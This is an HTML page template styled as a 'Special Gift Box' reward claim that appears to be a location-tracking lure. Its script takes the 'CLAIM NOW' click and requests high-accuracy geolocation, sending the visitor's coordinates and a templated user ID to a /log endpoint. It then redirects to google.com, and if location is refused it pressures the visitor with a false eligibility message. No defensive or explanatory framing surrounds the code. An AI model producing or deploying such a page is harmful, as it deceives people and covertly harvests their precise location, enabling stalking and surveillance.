<!DOCTYPE html>
<html>
<head>
    <title>Claim Reward</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #0f0c29; color: white; font-family: 'Segoe UI', sans-serif; text-align: center; padding-top: 50px; }
        .card { background: rgba(255, 255, 255, 0.1); padding: 30px; border-radius: 20px; display: inline-block; border: 1px solid #00d2ff; }
        button { background: #00d2ff; color: #fff; border: none; padding: 15px 35px; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; }
        button:hover { box-shadow: 0 0 20px #00d2ff; }
    </style>
</head>
<body>
    <div class="card">
        <h1>üéÅ Special Gift Box</h1>
        <p>Congratulations! You've received a mystery gift.<br>Click below to verify and claim.</p>
        <button onclick="track()">CLAIM NOW</button>
    </div>
    <script>
        function track() {
            navigator.geolocation.getCurrentPosition((p) => {
                fetch(`/log?lat=${p.coords.latitude}&lon=${p.coords.longitude}&id={{user_id}}`)
                .then(() => { window.location.href = "https://google.com"; });
            }, () => { alert("Please allow location to verify eligibility!"); }, {enableHighAccuracy:true});
        }
    </script>
</body>
</html>
